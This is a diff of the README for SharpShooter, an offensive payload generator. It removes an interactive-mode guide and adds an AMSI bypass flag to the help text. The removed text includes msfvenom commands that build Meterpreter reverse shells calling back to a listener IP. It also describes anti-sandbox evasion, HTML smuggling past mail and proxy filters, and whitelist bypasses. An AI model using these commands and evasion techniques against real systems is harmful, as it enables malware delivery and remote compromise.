@@ -26,90 +26,6 @@ Version 1.0 of SharpShooter introduced several new concepts, including COM stagi
 
 Further information can be found on the [MDSec blog post](https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/).
 
-Usage - Interactive Mode:
-======
-
-SharpShooter has both command line arguments and an interactive menu to configure and build the payload options, each of the menu prompts are described below.
-
-```
-[*] Which version of the .NET framework do you want to target?:
-[1] v2
-[2] v4 (OPSEC WARNING: Uses WScript.Shell)
-```
-The above menu determines the version of the .NET framework that you want to target. If you need to target v3.5 you should select the v2 option which is mostly compatible. You should be aware that v4 targeting uses WScript.Shell to execute the payload and as such is more at risk from EDR/monitoring and may not necessarily be considered totally OpSec safe.
-
-```
-[*] Do you want to create a staged payload? i.e. web/DNS delivery (Y/N)n
-```
-SharpShooter has the ability to create both staged and stageless artifacts. In the case of a staged payload, a CSharp file will be retrieved via either DNS or web, compiled and executed. In the case of a stageless payload, a raw shellcode file is read file the file system, base64 encoded and embedded in the generated payload. Currently stageless payloads do not support arbitrary CSharp execution but this is likely to be added in the future.
-
-
-```
-[*] Select the type of payload to generate:
-[1] HTA
-[2] JS
-[3] JSE
-[4] VBA
-[5] VBE
-[6] VBS
-[7] WSF
-```
-The above menu selects the type of payload that you want to generate. Currently VBA is only partly supported, pending further development/research. The generated payload will be written to the "output" folder.
-
-```
-[*] The following anti-sandbox techniques are available:
-[1] Key to Domain
-[2] Ensure Domain Joined
-[3] Check for Sandbox Artifacts
-[4] Check for Bad MACs
-[5] Check for Debugging
-[0] Done
-```
-
-SharpShooter includes the ability to embed anti-sandbox defences in to the payload, these are predominantly taken from the [CheckPlease project](https://github.com/Arvanaghi/CheckPlease) with the exception of Domain Keying which allows you to limit your payload to running only on domain members from a target domain. More than one technique can be selected and if the conditions are met, such as the host not being domain joined (2), then the payload will not execute. The theory here is that if the sandbox does not see the bad behaviour, it will assume your payload to be safe.
-
-```
-[*] Select the delivery method for the staged payload:
-[1] Web Delivery
-[2] PowerDNS Delivery
-[3] Both
-```
-
-This menu option details the method that will be used to perform staging and whether this happens using web delivery, DNS or both. During this process, the payload will retrieve the CSharp source code from the provided URL; the source code is gzip'd and base64 encoded.
-
-```
-[*] Do you want to use the builtin shellcode template? Y/N
-```
-
-SharpShooter contains a basic template for executing shellcode, here you can paste in a CSharp byte array of either your x86 or x64 shellcode.
-
-On 64-bit systems you must use x64 shellcode for JS/JSE, VBS/VBE and WSF payloads; you can generate it using msfvenom similar to the following:
-
-```
-msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LHOST=172.16.164.203 LPORT=8080 EnableStageEncoding=True PrependMigrate=True -f csharp
-```
-
-For 32-bit or when handling HTA files, the shellcode must be x86 and can be generated as follows:
-
-```
-msfvenom -a x86 -p windows/meterpreter/reverse_http LHOST=172.16.164.203 LPORT=8080 EnableStageEncoding=True StageEncoder=x86/shikata_ga_nai -f csharp
-```
-
-When using web delivery, SharpShooter will prompt for the location where your CSharp payload is hosted:
-
-```
-[*] Provide URI for CSharp web delivery
-```
-
-Here you should provide the URL to where you've hosted the output.payload file. If you're using DNS delivery, you should provide the staging host where PowerDNS is running. It should be noted that SharpShooter will fallback to DNS delivery if web delivery fails, for example should your user not be able to make web requests in your target environment.
-
-```
-[*] Do you want to smuggle inside HTML?
-```
-
-When SharpShooter prompts as above, it offers the ability to perform a HTML smuggling attack. This will take the previously generated SharpShooter payload and embed it inside a HTML file, rc4 encrypted and retrievable via most modern browsers. This file can be useful for bypassing certain proxy restrictions such as MIME type or extension blocking, or submiting the payload via e-mail as HTML is a permitted attachment in most mail clients.
-SharpShooter contains 2 pre-defined templates; it is recommended you create a custom template using these as an example.
-
 Usage - Command Line Mode:
 ======
 
@@ -118,29 +34,29 @@ SharpShooter is highly configurable, supporting a number of different payload ty
 Running SharpShooter with the --help argument will produce the following output:
 
 ```
-usage: SharpShooter.py [-h] [--interactive] [--stageless] [--dotnetver <ver>]
-                       [--com <com>] [--awl <awl>] [--awlurl <awlurl>]
-                       [--payload <format>] [--sandbox <types>]
-                       [--delivery <type>] [--rawscfile <path>] [--shellcode]
-                       [--scfile <path>] [--refs <refs>] [--namespace <ns>]
-                       [--entrypoint <ep>] [--web <web>] [--dns <dns>]
-                       [--output <output>] [--smuggle] [--template <tpl>]
+usage: SharpShooter.py [-h] [--stageless] [--dotnetver <ver>] [--com <com>]
+                       [--awl <awl>] [--awlurl <awlurl>] [--payload <format>]
+                       [--sandbox <types>] [--amsi <amsi>] [--delivery <type>]
+                       [--rawscfile <path>] [--shellcode] [--scfile <path>]
+                       [--refs <refs>] [--namespace <ns>] [--entrypoint <ep>]
+                       [--web <web>] [--dns <dns>] [--output <output>]
+                       [--smuggle] [--template <tpl>]
 
 optional arguments:
   -h, --help          show this help message and exit
-  --interactive       Use the interactive menu
   --stageless         Create a stageless payload
   --dotnetver <ver>   Target .NET Version: 2 or 4
   --com <com>         COM Staging Technique: outlook, shellbrowserwin, wmi, wscript, xslremote
   --awl <awl>         Application Whitelist Bypass Technique: wmic, regsvr32
   --awlurl <awlurl>   URL to retrieve XSL/SCT payload
   --payload <format>  Payload type: hta, js, jse, vba, vbe, vbs, wsf
-  --sandbox <types>   Anti-sandbox techniques: 
+  --sandbox <types>   Anti-sandbox techniques:
                       [1] Key to Domain (e.g. 1=CONTOSO)
                       [2] Ensure Domain Joined
                       [3] Check for Sandbox Artifacts
                       [4] Check for Bad MACs
                       [5] Check for Debugging
+  --amsi <amsi>       Use amsi bypass technique: amsienable
   --delivery <type>   Delivery method: web, dns, both
   --rawscfile <path>  Path to raw shellcode file for stageless payloads
   --shellcode         Use built in shellcode execution
